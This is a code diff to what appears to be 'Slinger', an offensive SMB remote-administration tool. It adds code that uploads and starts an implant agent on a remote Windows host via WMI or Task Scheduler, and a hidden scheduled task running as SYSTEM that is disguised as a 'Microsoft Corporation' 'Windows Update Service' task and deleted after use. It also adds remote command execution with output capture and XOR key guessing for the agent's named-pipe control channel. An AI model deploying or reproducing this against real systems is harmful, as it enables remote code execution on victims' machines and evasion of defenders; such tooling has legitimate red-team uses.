@@ -97,10 +97,10 @@ class SlingerClient(
 
     def login(self):
         print_info(f"Connecting to {self.host}:{self.port}...")
-        timeout_val = get_config_value("smb_conn_timeout")
+        auth_timeout = get_config_value("smb_auth_timeout")
         try:
             self.conn = smbconnection.SMBConnection(
-                self.host, self.host, sess_port=self.port, timeout=timeout_val
+                self.host, self.host, sess_port=self.port, timeout=auth_timeout
             )
         except Exception as e:
             print_debug(str(e), sys.exc_info())
@@ -112,8 +112,8 @@ class SlingerClient(
             self.is_logged_in = False
             raise Exception("Failed to create SMB connection.")
 
-        # Ensure timeout is set on connection object
-        self.conn._timeout = int(timeout_val)
+        # Ensure timeout is set on connection object for authentication
+        self.conn._timeout = int(auth_timeout)
 
         try:
             if self.use_kerberos:
@@ -956,129 +956,117 @@ class SlingerClient(
                 self.upload(args.agent_path, remote_path)
                 print_good(f"✓ Agent uploaded successfully")
 
+                # Resolve share to disk path for proper path construction
+                share_disk_path = self._resolve_share_path(self.share)
+
+                # Build full execution path using resolved share path
+                if share_disk_path:
+                    # Use resolved disk path (e.g., ADMIN$ -> C:\Windows)
+                    # Strip leading backslash from remote_path to avoid C:\Windows\\file.exe
+                    clean_remote = remote_path.lstrip("\\")
+                    full_path = f"{share_disk_path}\\{clean_remote}"
+                elif self.share.endswith("$") and len(self.share) == 2:
+                    # Fallback for drive shares like C$, D$ if resolution failed
+                    drive = self.share[:-1] + ":"
+                    clean_remote = remote_path.lstrip("\\")
+                    full_path = f"{drive}\\{clean_remote}"
+                else:
+                    # Last resort fallback
+                    print_warning(
+                        f"Could not resolve share path for '{self.share}', using fallback"
+                    )
+                    clean_remote = remote_path.lstrip("\\")
+                    full_path = f"C:\\{clean_remote}"
+
+                # Normalize path - replace any double backslashes and ensure single backslashes
+                full_path = full_path.replace("\\\\", "\\")  # Clean up double slashes
+
+                # Prepare agent info for registry (save regardless of start success)
+                agent_id = agent_name.replace(".exe", "")
+
+                # Determine pipe name: --pipe flag > build registry > discovery placeholder
+                build_info = self._lookup_build_registry(args.agent_path)
+                if hasattr(args, "pipe") and args.pipe:
+                    pipe_name = args.pipe
+                    pipe_source = "flag"
+                elif build_info and build_info.get("pipe_name"):
+                    pipe_name = build_info["pipe_name"]
+                    pipe_source = "registry"
+                else:
+                    # For agents without known pipe names, use placeholder that will be discovered later
+                    pipe_name = f"slinger_agent_{agent_id}"  # placeholder, will be discovered
+                    pipe_source = "placeholder"
+
+                # Get XOR key from build registry (encryption_seed & 0xFF)
+                xor_key = None
+                if build_info and "encryption_seed" in build_info:
+                    xor_key = build_info["encryption_seed"] & 0xFF
+
+                # Get passphrase and auth status from build registry
+                passphrase = None
+                auth_enabled = False
+                if build_info:
+                    passphrase = build_info.get("passphrase")
+                    auth_enabled = build_info.get("auth_enabled", False)
+
                 # Start agent if requested
+                process_id = None
+                agent_status = "uploaded"
                 if args.start:
-                    print_info("Starting agent via WMI DCOM...")
+                    method = getattr(args, "method", "wmiexec")
+                    result = self._start_agent_process(full_path, method=method)
 
-                    # Resolve share to disk path FIRST for proper path construction
-                    share_disk_path = self._resolve_share_path(self.share)
-
-                    # Build full execution path using resolved share path
-                    if share_disk_path:
-                        # Use resolved disk path (e.g., ADMIN$ -> C:\Windows)
-                        # Strip leading backslash from remote_path to avoid C:\Windows\\file.exe
-                        clean_remote = remote_path.lstrip("\\")
-                        full_path = f"{share_disk_path}\\{clean_remote}"
-                    elif self.share.endswith("$") and len(self.share) == 2:
-                        # Fallback for drive shares like C$, D$ if resolution failed
-                        drive = self.share[:-1] + ":"
-                        clean_remote = remote_path.lstrip("\\")
-                        full_path = f"{drive}\\{clean_remote}"
+                    if result.get("success", False):
+                        print_good("✓ Agent started successfully")
+                        process_id = result.get("process_id")
+                        if process_id:
+                            print_good(f"✓ Agent PPID: {process_id} (parent process)")
+                        agent_status = "running"
                     else:
-                        # Last resort fallback
-                        print_warning(
-                            f"Could not resolve share path for '{self.share}', using fallback"
-                        )
-                        clean_remote = remote_path.lstrip("\\")
-                        full_path = f"C:\\{clean_remote}"
+                        print_bad(f"Failed to start agent: {result.get('error', 'Unknown error')}")
+                        print_info("Agent uploaded but not started - you may start it manually")
+                        agent_status = "uploaded"
 
-                    # Normalize path - replace any double backslashes and ensure single backslashes
-                    full_path = full_path.replace("\\\\", "\\")  # Clean up double slashes
+                # Always save agent info to registry (even if start failed)
+                agent_info = {
+                    "id": agent_id,
+                    "name": agent_name,
+                    "host": self.host,
+                    "path": full_path,
+                    "share_name": self.share,
+                    "share_path": share_disk_path,
+                    "pipe_name": pipe_name,
+                    "xor_key": xor_key,
+                    "passphrase": passphrase,
+                    "auth_enabled": auth_enabled,
+                    "process_id": process_id,
+                    "deployed_at": str(datetime.datetime.now()),
+                    "status": agent_status,
+                    "on_disk": "Present",  # Just uploaded successfully
+                    "last_checked": None,
+                }
 
-                    try:
-                        # Use existing WMI execution capability
-                        # Start agent directly (not using start /b to capture PID)
-                        command = f'"{full_path}"'
-                        print_verbose(f"Executing: {command}")
+                # Save agent info to local registry
+                self._save_agent_info(agent_info)
 
-                        result = self.execute_wmi_command(command, capture_output=False, timeout=10)
+                print_good(f"✓ Agent registered with ID: {agent_id}")
+                print_info(f"Agent file: {agent_name}")
+                print_info(f"Agent path: {full_path}")
 
-                        if result.get("success", False):
-                            print_good("✓ Agent started successfully")
+                # Show pipe name source
+                if pipe_source == "flag":
+                    print_info(f"Pipe name: {pipe_name} (from --pipe flag)")
+                elif pipe_source == "registry":
+                    print_info(f"Pipe name: {pipe_name} (from build registry)")
+                else:
+                    print_info(f"Pipe name: {pipe_name} (placeholder - will be discovered)")
 
-                            # Get process ID from WMI execution result (this is the parent process)
-                            process_id = result.get("process_id")
-                            if process_id:
-                                print_good(f"✓ Agent PPID: {process_id} (parent process)")
-
-                            # Store agent info for tracking
-                            agent_id = agent_name.replace(".exe", "")
-
-                            # Determine pipe name: --pipe flag > build registry > discovery placeholder
-                            build_info = self._lookup_build_registry(args.agent_path)
-                            if hasattr(args, "pipe") and args.pipe:
-                                pipe_name = args.pipe
-                                pipe_source = "flag"
-                            elif build_info and build_info.get("pipe_name"):
-                                pipe_name = build_info["pipe_name"]
-                                pipe_source = "registry"
-                            else:
-                                # For agents without known pipe names, use placeholder that will be discovered later
-                                pipe_name = (
-                                    f"slinger_agent_{agent_id}"  # placeholder, will be discovered
-                                )
-                                pipe_source = "placeholder"
-
-                            # Get XOR key from build registry (encryption_seed & 0xFF)
-                            xor_key = None
-                            if build_info and "encryption_seed" in build_info:
-                                xor_key = build_info["encryption_seed"] & 0xFF
-
-                            # Get passphrase and auth status from build registry
-                            passphrase = None
-                            auth_enabled = False
-                            if build_info:
-                                passphrase = build_info.get("passphrase")
-                                auth_enabled = build_info.get("auth_enabled", False)
-
-                            # share_disk_path already resolved above for path construction
-
-                            agent_info = {
-                                "id": agent_id,
-                                "name": agent_name,
-                                "host": self.host,
-                                "path": full_path,
-                                "share_name": self.share,
-                                "share_path": share_disk_path,
-                                "pipe_name": pipe_name,
-                                "xor_key": xor_key,
-                                "passphrase": passphrase,
-                                "auth_enabled": auth_enabled,
-                                "process_id": process_id,
-                                "deployed_at": str(datetime.datetime.now()),
-                                "status": "running",
-                                "on_disk": "Present",  # Just uploaded successfully
-                                "last_checked": None,
-                            }
-
-                            # Save agent info to local registry
-                            self._save_agent_info(agent_info)
-
-                            print_good(f"✓ Agent deployed with ID: {agent_id}")
-                            print_info(f"Agent process: {agent_name}")
-
-                            # Show pipe name source
-                            if pipe_source == "flag":
-                                print_info(f"Pipe name: {pipe_name} (from --pipe flag)")
-                            elif pipe_source == "registry":
-                                print_info(f"Pipe name: {pipe_name} (from build registry)")
-                            else:
-                                print_info(
-                                    f"Pipe name: {pipe_name} (placeholder - will be discovered)"
-                                )
-
-                            print_info(f"Named pipe: \\\\{self.host}\\pipe\\{pipe_name}")
-                            print_warning(f"Use 'agent use {agent_id}' to interact with this agent")
-                            print_info(f"Use 'agent list' to see all deployed agents")
-                        else:
-                            print_bad(
-                                f"Failed to start agent: {result.get('error', 'Unknown error')}"
-                            )
-                            print_info("Agent uploaded but not started - you may start it manually")
-
-                    except Exception as e:
-                        print_warning(f"Agent uploaded but failed to start: {e}")
-                        print_info("You may need to start it manually or check WMI connectivity")
+                print_info(f"Named pipe: \\\\{self.host}\\pipe\\{pipe_name}")
+                if agent_status == "running":
+                    print_warning(f"Use 'agent use {agent_id}' to interact with this agent")
+                else:
+                    print_warning(f"Use 'agent start {agent_id}' to start this agent")
+                print_info(f"Use 'agent list' to see all deployed agents")
 
             except Exception as e:
                 print_bad(f"Failed to upload agent: {e}")
@@ -1115,6 +1103,266 @@ class SlingerClient(
         except Exception as e:
             print_debug(f"Failed to resolve share path: {e}")
             return None
+
+    def _start_agent_process(self, full_path, method="wmiexec"):
+        """Start an agent process using specified method
+
+        Args:
+            full_path: Full Windows path to the agent executable (e.g., C:\\agent.exe)
+            method: Execution method - 'wmiexec' or 'atexec'
+
+        Returns:
+            dict with 'success', 'process_id', 'error' keys
+        """
+        from slingerpkg.utils.printlib import print_info, print_verbose, print_debug
+        from slingerpkg.utils.common import generate_random_string
+
+        if method == "wmiexec":
+            print_info("Starting agent via WMI DCOM...")
+            command = f'"{full_path}"'
+            print_verbose(f"Executing: {command}")
+
+            try:
+                result = self.execute_wmi_command(command, capture_output=False, timeout=10)
+                return result
+            except Exception as e:
+                return {"success": False, "error": str(e), "process_id": None}
+
+        elif method == "atexec":
+            print_info("Starting agent via Task Scheduler (atexec)...")
+            try:
+                # Generate random task name
+                task_name = f"SlingerAgent_{generate_random_string(6, 8)}"
+                task_folder = "\\Windows"
+
+                # Create XML for task that just runs the executable (no output capture)
+                from slingerpkg.utils.common import generate_random_date, xml_escape
+
+                timestamp = generate_random_date()
+                # Run the agent directly, no cmd wrapper needed for executables
+                xml = f"""<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+    <RegistrationInfo>
+        <Author>Microsoft Corporation</Author>
+        <Description>Windows Update Service</Description>
+        <URI>\\{xml_escape(task_name)}</URI>
+    </RegistrationInfo>
+    <Triggers>
+        <CalendarTrigger>
+            <StartBoundary>{timestamp}</StartBoundary>
+            <Enabled>true</Enabled>
+            <ScheduleByDay>
+                <DaysInterval>1</DaysInterval>
+            </ScheduleByDay>
+        </CalendarTrigger>
+    </Triggers>
+    <Principals>
+        <Principal id="LocalSystem">
+            <UserId>S-1-5-18</UserId>
+            <RunLevel>HighestAvailable</RunLevel>
+        </Principal>
+    </Principals>
+    <Settings>
+        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+        <AllowHardTerminate>true</AllowHardTerminate>
+        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+        <IdleSettings>
+            <StopOnIdleEnd>true</StopOnIdleEnd>
+            <RestartOnIdle>false</RestartOnIdle>
+        </IdleSettings>
+        <AllowStartOnDemand>true</AllowStartOnDemand>
+        <Enabled>true</Enabled>
+        <Hidden>true</Hidden>
+        <RunOnlyIfIdle>false</RunOnlyIfIdle>
+        <WakeToRun>false</WakeToRun>
+        <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+        <Priority>7</Priority>
+    </Settings>
+    <Actions Context="LocalSystem">
+        <Exec>
+            <Command>{xml_escape(full_path)}</Command>
+        </Exec>
+    </Actions>
+</Task>
+"""
+                # Connect to atsvc pipe
+                self.setup_dce_transport()
+                self.dce_transport._connect("atsvc")
+
+                # Create the task
+                print_verbose(f"Creating task: {task_name}")
+                response = self.dce_transport._create_task(task_name, task_folder, xml)
+                if response["ErrorCode"] != 0:
+                    return {
+                        "success": False,
+                        "error": f"Failed to create task (error {response['ErrorCode']})",
+                        "process_id": None,
+                    }
+
+                # Reconnect and run the task
+                self.dce_transport._connect("atsvc")
+                full_task_path = f"{task_folder}\\{task_name}"
+                print_verbose(f"Running task: {full_task_path}")
+                response = self.dce_transport._run_task(full_task_path)
+                if response["ErrorCode"] != 0:
+                    return {
+                        "success": False,
+                        "error": f"Failed to run task (error {response['ErrorCode']})",
+                        "process_id": None,
+                    }
+
+                # Reconnect and delete the task
+                self.dce_transport._connect("atsvc")
+                print_verbose(f"Deleting task: {full_task_path}")
+                self.dce_transport._delete_task(full_task_path)
+
+                # Task Scheduler doesn't return PID directly
+                return {"success": True, "process_id": None, "error": None}
+
+            except Exception as e:
+                print_debug(f"atexec exception: {e}", sys.exc_info())
+                return {"success": False, "error": str(e), "process_id": None}
+
+        else:
+            return {"success": False, "error": f"Unknown method: {method}", "process_id": None}
+
+    def _execute_via_atexec(self, command):
+        """Execute a command via Task Scheduler (atexec) and capture output
+
+        Args:
+            command: Command to execute
+
+        Returns:
+            dict with 'success', 'output', 'error' keys
+        """
+        from slingerpkg.utils.printlib import print_debug, print_verbose
+        from slingerpkg.utils.common import (
+            generate_random_string,
+            generate_random_date,
+            xml_escape,
+        )
+        from time import sleep
+
+        try:
+            # Generate random task and output file names
+            task_name = f"SlingerTask_{generate_random_string(6, 8)}"
+            task_folder = "\\Windows"
+            output_file = f"{generate_random_string(8, 10)}.txt"
+
+            # Get share path for output file
+            share_info = self.list_shares(args=None, echo=False, ret=True)
+            share_path = None
+            for share in share_info or []:
+                if share["name"].upper() == self.share.upper():
+                    share_path = share["path"].rstrip("\\")
+                    break
+
+            if not share_path:
+                return {"success": False, "output": "", "error": "Could not resolve share path"}
+
+            # Build output path
+            output_path = f"{share_path}\\{output_file}"
+
+            # Create XML for task that captures output
+            timestamp = generate_random_date()
+            escaped_command = xml_escape(f"/C {command} > {output_path} 2>&1")
+            xml = f"""<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+    <RegistrationInfo>
+        <Author>Microsoft Corporation</Author>
+        <Description>Windows Update Service</Description>
+        <URI>\\{xml_escape(task_name)}</URI>
+    </RegistrationInfo>
+    <Triggers>
+        <CalendarTrigger>
+            <StartBoundary>{timestamp}</StartBoundary>
+            <Enabled>true</Enabled>
+            <ScheduleByDay>
+                <DaysInterval>1</DaysInterval>
+            </ScheduleByDay>
+        </CalendarTrigger>
+    </Triggers>
+    <Principals>
+        <Principal id="LocalSystem">
+            <UserId>S-1-5-18</UserId>
+            <RunLevel>HighestAvailable</RunLevel>
+        </Principal>
+    </Principals>
+    <Settings>
+        <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+        <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+        <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+        <AllowHardTerminate>true</AllowHardTerminate>
+        <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+        <IdleSettings>
+            <StopOnIdleEnd>true</StopOnIdleEnd>
+            <RestartOnIdle>false</RestartOnIdle>
+        </IdleSettings>
+        <AllowStartOnDemand>true</AllowStartOnDemand>
+        <Enabled>true</Enabled>
+        <Hidden>true</Hidden>
+        <RunOnlyIfIdle>false</RunOnlyIfIdle>
+        <WakeToRun>false</WakeToRun>
+        <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+        <Priority>7</Priority>
+    </Settings>
+    <Actions Context="LocalSystem">
+        <Exec>
+            <Command>cmd.exe</Command>
+            <Arguments>{escaped_command}</Arguments>
+        </Exec>
+    </Actions>
+</Task>
+"""
+            # Connect to atsvc pipe
+            self.setup_dce_transport()
+            self.dce_transport._connect("atsvc")
+
+            # Create the task
+            print_verbose(f"Creating task: {task_name}")
+            response = self.dce_transport._create_task(task_name, task_folder, xml)
+            if response["ErrorCode"] != 0:
+                return {
+                    "success": False,
+                    "output": "",
+                    "error": f"Failed to create task (error {response['ErrorCode']})",
+                }
+
+            # Reconnect and run the task
+            self.dce_transport._connect("atsvc")
+            full_task_path = f"{task_folder}\\{task_name}"
+            print_verbose(f"Running task: {full_task_path}")
+            response = self.dce_transport._run_task(full_task_path)
+            if response["ErrorCode"] != 0:
+                return {
+                    "success": False,
+                    "output": "",
+                    "error": f"Failed to run task (error {response['ErrorCode']})",
+                }
+
+            # Reconnect and delete the task
+            self.dce_transport._connect("atsvc")
+            print_verbose(f"Deleting task: {full_task_path}")
+            self.dce_transport._delete_task(full_task_path)
+
+            # Wait for command to complete and read output
+            sleep(2)
+
+            try:
+                # Read output file
+                output_content = self._read_file_content(output_file)
+                # Delete output file
+                self.delete(output_file)
+                return {"success": True, "output": output_content, "error": None}
+            except Exception as read_error:
+                print_debug(f"Failed to read output file: {read_error}")
+                return {"success": True, "output": "", "error": None}
+
+        except Exception as e:
+            print_debug(f"atexec exception: {e}", sys.exc_info())
+            return {"success": False, "output": "", "error": str(e)}
 
     def _save_agent_info(self, agent_info):
         """Save agent information to local registry file"""
@@ -1621,30 +1869,53 @@ class SlingerClient(
 
                 print_good(f"Found {len(process_ids)} process(es): {process_ids}")
 
-                # Kill each found process using taskkill via WMI DCOM
-                # Use default temp_dir - execute_wmi_command will use current session share automatically
+                # Kill each found process using taskkill
+                # Use specified method (wmiexec or atexec)
+                method = getattr(args, "method", "wmiexec")
+                print_info(f"Using {method} method to terminate processes")
+
                 for pid in process_ids:
                     print_info(f"Terminating process {pid}...")
+                    kill_command = f"taskkill /F /PID {pid}"
 
                     try:
-                        # Use existing execute_wmi_command method
-                        kill_command = f"taskkill /F /PID {pid}"
+                        if method == "wmiexec":
+                            # Use WMI DCOM for command execution
+                            result = self.execute_wmi_command(
+                                command=kill_command, capture_output=True, timeout=10, shell="cmd"
+                            )
 
-                        result = self.execute_wmi_command(
-                            command=kill_command, capture_output=True, timeout=10, shell="cmd"
-                        )
+                            if result.get("success"):
+                                output = result.get("output", "")
+                                print_debug(f"Taskkill output: {output}")
 
-                        if result.get("success"):
-                            output = result.get("output", "")
-                            print_debug(f"Taskkill output: {output}")
-
-                            if "SUCCESS" in output.upper() or "terminated" in output.lower():
-                                print_good(f"✓ Successfully terminated process {pid}")
+                                if "SUCCESS" in output.upper() or "terminated" in output.lower():
+                                    print_good(f"✓ Successfully terminated process {pid}")
+                                else:
+                                    print_warning(
+                                        f"Process {pid} termination status: {output.strip()}"
+                                    )
                             else:
-                                print_warning(f"Process {pid} termination status: {output.strip()}")
-                        else:
-                            print_bad(f"Failed to terminate process {pid}")
-                            print_debug(f"Error: {result.get('error')}")
+                                print_bad(f"Failed to terminate process {pid}")
+                                print_debug(f"Error: {result.get('error')}")
+
+                        elif method == "atexec":
+                            # Use Task Scheduler for command execution
+                            result = self._execute_via_atexec(kill_command)
+
+                            if result.get("success"):
+                                output = result.get("output", "")
+                                print_debug(f"Taskkill output: {output}")
+
+                                if "SUCCESS" in output.upper() or "terminated" in output.lower():
+                                    print_good(f"✓ Successfully terminated process {pid}")
+                                else:
+                                    print_warning(
+                                        f"Process {pid} termination status: {output.strip()}"
+                                    )
+                            else:
+                                print_bad(f"Failed to terminate process {pid}")
+                                print_debug(f"Error: {result.get('error')}")
 
                     except Exception as kill_error:
                         print_bad(f"Failed to terminate process {pid}: {kill_error}")
@@ -1693,24 +1964,21 @@ class SlingerClient(
                 print_bad(f"No path recorded for agent '{args.agent_id}'")
                 return
 
-            print_info(f"Restarting agent: {args.agent_id}")
+            print_info(f"Starting agent: {args.agent_id}")
             print_info(f"Executable path: {agent_path}")
 
-            # Execute the agent using WMI
-            command = f'"{agent_path}"'
+            # Get execution method from args (default: wmiexec)
+            method = getattr(args, "method", "wmiexec")
 
             try:
-                # Force fresh WMI connection
-                if hasattr(self, "_wmi_services"):
-                    self._wmi_services.pop("root/cimv2", None)
-
-                # Use WMI to start the process
-                result = self.execute_wmi_command(command, capture_output=False, timeout=10)
+                # Use the unified start method
+                result = self._start_agent_process(agent_path, method=method)
 
                 if result.get("success", False):
                     process_id = result.get("process_id")
-                    print_good(f"✓ Agent restarted successfully")
-                    print_info(f"  Process ID: {process_id}")
+                    print_good(f"✓ Agent started successfully")
+                    if process_id:
+                        print_info(f"  Process ID: {process_id}")
 
                     # Update process ID in registry
                     agents[args.agent_id]["process_id"] = process_id
@@ -1720,17 +1988,17 @@ class SlingerClient(
                     with open(registry_file, "w") as f:
                         json.dump(agents, f, indent=2)
 
-                    print_info("Registry updated with new process ID")
+                    print_info("Registry updated")
                 else:
                     error_msg = result.get("error", "Unknown error")
-                    print_bad(f"✗ Failed to restart agent: {error_msg}")
+                    print_bad(f"✗ Failed to start agent: {error_msg}")
 
             except Exception as e:
-                print_bad(f"Failed to execute agent via WMI: {e}")
+                print_bad(f"Failed to execute agent: {e}")
                 print_debug(f"Exception details: {e}")
 
         except Exception as e:
-            print_bad(f"Failed to restart agent: {e}")
+            print_bad(f"Failed to start agent: {e}")
             print_debug(f"Exception details: {e}")
 
     def agent_rm_handler(self, args):
@@ -2258,6 +2526,31 @@ class SlingerClient(
                         decoded_data = self._xor_decode(response_data, xor_key)
                         ack_msg = decoded_data.decode("utf-8", errors="replace").strip()
                         print_debug(f"Received XOR-encoded ACK: {ack_msg}")
+
+                        # Validate ACK message - if not "ACK", there's likely an XOR key mismatch
+                        if ack_msg != "ACK":
+                            print_warning("XOR key mismatch detected!")
+                            print_warning(f"Expected 'ACK' but got: {repr(ack_msg[:50])}")
+                            print_info(
+                                "This usually means an older agent process is still running."
+                            )
+                            print_info(
+                                "Try: 1) Kill old agent processes on target, 2) Re-deploy with unique pipe name"
+                            )
+
+                            # Try to auto-detect correct XOR key
+                            for test_key in range(256):
+                                test_decoded = self._xor_decode(response_data, test_key)
+                                test_msg = test_decoded.decode("utf-8", errors="replace").strip()
+                                if test_msg == "ACK":
+                                    print_info(
+                                        f"Detected actual XOR key: {test_key} (expected: {xor_key})"
+                                    )
+                                    print_info("Updating agent info with detected key...")
+                                    agent_info["xor_key"] = test_key
+                                    self._save_agent_info(agent_info)
+                                    print_good(f"Agent XOR key corrected to {test_key}")
+                                    break
                     else:
                         print_warning(f"Unexpected message type: 0x{msg_type:04x}")
 
@@ -2338,12 +2631,14 @@ class SlingerClient(
             try:
                 while True:
                     try:
-                        # Get user input with prompt showing current directory
+                        # Show agent ID above prompt, directory as part of prompt line
                         if no_colors:
-                            prompt_text = f"agent:{agent_info['id']}:{current_dir}> "
+                            print(f"agent:{agent_info['id']}:")
+                            prompt_text = f"{current_dir}> "
                         else:
+                            print_log(f"agent:{agent_info['id']}:")
                             prompt_text = HTML(
-                                f"<ansiblue>agent:</ansiblue><ansiyellow>{agent_info['id']}</ansiyellow><ansiblue>:</ansiblue><ansigreen>{current_dir}</ansigreen><ansiblue>> </ansiblue>"
+                                f"<ansigreen>{current_dir}</ansigreen><ansiblue>> </ansiblue>"
                             )
                         command = session.prompt(prompt_text).strip()
 
@@ -2411,7 +2706,12 @@ class SlingerClient(
                                 response = decoded_data.decode("utf-8", errors="replace")
 
                             # Filter out "Current directory:" lines from output (only for prompt display)
-                            if not response.strip().startswith("Current directory:"):
+                            # Agent returns "[*] Current directory: ..." format
+                            resp_stripped = response.strip()
+                            if not (
+                                resp_stripped.startswith("Current directory:")
+                                or resp_stripped.startswith("[*] Current directory:")
+                            ):
                                 print_log(response)
 
                             # Update current directory if cd command was successful
@@ -2426,15 +2726,22 @@ class SlingerClient(
                                             pwd_str = pwd_data.decode("utf-8", errors="replace")
                                             new_dir = auth.decrypt_message(pwd_str)
                                             if new_dir:
-                                                # Strip "Current directory: " prefix if present
-                                                if new_dir.strip().startswith("Current directory:"):
-                                                    current_dir = (
-                                                        new_dir.strip()
-                                                        .replace("Current directory:", "")
-                                                        .strip()
-                                                    )
+                                                # Strip "[*] Current directory: " prefix if present
+                                                new_dir_stripped = new_dir.strip()
+                                                if new_dir_stripped.startswith(
+                                                    "[*] Current directory:"
+                                                ):
+                                                    current_dir = new_dir_stripped.replace(
+                                                        "[*] Current directory:", ""
+                                                    ).strip()
+                                                elif new_dir_stripped.startswith(
+                                                    "Current directory:"
+                                                ):
+                                                    current_dir = new_dir_stripped.replace(
+                                                        "Current directory:", ""
+                                                    ).strip()
                                                 else:
-                                                    current_dir = new_dir.strip()
+                                                    current_dir = new_dir_stripped
                                 else:
                                     xor_key = agent_info.get("xor_key")
                                     if self._send_pipe_message(0x1001, pwd_command, xor_key):
@@ -2444,8 +2751,12 @@ class SlingerClient(
                                             new_dir = decoded.decode(
                                                 "utf-8", errors="replace"
                                             ).strip()
-                                            # Strip "Current directory: " prefix if present
-                                            if new_dir.startswith("Current directory:"):
+                                            # Strip "[*] Current directory: " prefix if present
+                                            if new_dir.startswith("[*] Current directory:"):
+                                                current_dir = new_dir.replace(
+                                                    "[*] Current directory:", ""
+                                                ).strip()
+                                            elif new_dir.startswith("Current directory:"):
                                                 current_dir = new_dir.replace(
                                                     "Current directory:", ""
                                                 ).strip()
